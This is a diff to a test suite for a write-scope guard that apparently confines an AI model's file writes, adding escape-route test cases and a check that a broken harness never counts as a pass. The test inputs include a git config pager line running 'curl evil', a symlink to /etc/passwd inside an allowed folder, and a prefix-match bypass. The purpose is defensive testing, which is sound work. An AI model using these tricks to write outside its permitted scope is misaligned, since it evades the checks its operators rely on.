@@ -161,6 +161,7 @@ BIRD=t; WORK="$PWD"; QDIR="quarantine/t"; DAY="d"; BRANCH=main; DRY_RUN=0
 STATUS=started; DETAIL=""; FINDS=0
 QFILE="$QDIR/$DAY.md"
 mkdir -p "$QDIR"
+declare -F corvid_guard >/dev/null || { echo "HARNESS: corvid_guard undefined"; exit 90; }
 CORVID_GIT_SEAL="$(_corvid_git_seal)"   # corvid_think does this before the model runs
 STATE="$PWD/.state"; mkdir -p "$STATE"
 eval "$SETUP"
@@ -204,6 +205,16 @@ CASES = [
      'CORVID_WRITE_SCOPE=("$QFILE"); echo hi > "$QFILE"; '
      'printf "[core]\\n\\tpager = sh -c \'curl evil\'\\n" >> .git/config',
      True, "same blind spot: config controls what git itself executes"),
+    ("subtree scope is a path boundary, not a prefix",
+     'CORVID_GUARD_MODE=subtree; CORVID_WRITE_SCOPE=("sub"); '
+     'mkdir -p sub sub-evil; echo a > sub/ok.md; echo b > sub-evil/x.md',
+     True, "a scope of `sub` must not silently accept `sub-evil/` — string-prefix "
+           "matching would have allowed it"),
+    ("symlink inside a writable subtree",
+     'CORVID_GUARD_MODE=subtree; CORVID_WRITE_SCOPE=("sub"); '
+     'mkdir -p sub; echo a > sub/ok.md; ln -s /etc/passwd sub/link',
+     True, "a symlink in an allowed subtree can redirect a write out of the tree "
+           "while the path itself still looks in scope"),
     ("subtree file cap",
      'CORVID_GUARD_MODE=subtree; CORVID_WRITE_SCOPE=("sub/"); CORVID_MAX_FILES=2; '
      'mkdir -p sub; for i in 1 2 3; do echo x > sub/$i.md; done',
@@ -241,6 +252,11 @@ def cmd_verify(a: argparse.Namespace) -> int:
             violated = "BLAST RADIUS VIOLATION" in out and r.returncode != 0
             passed = "GUARD_PASSED" in out and r.returncode == 0
             ok = violated if expect_violation else passed
+            # A broken chassis must never score as a pass. Earlier a mangled
+            # corvid.sh left corvid_guard undefined and two "allowed" cases went
+            # green because nothing had failed — the suite was testing nothing.
+            if r.returncode == 90 or "HARNESS:" in out:
+                ok, why = False, "the chassis did not load — this suite proved nothing"
 
             # a tripped guard must also leave the tree clean, not just complain
             if ok and expect_violation and "git " not in name:
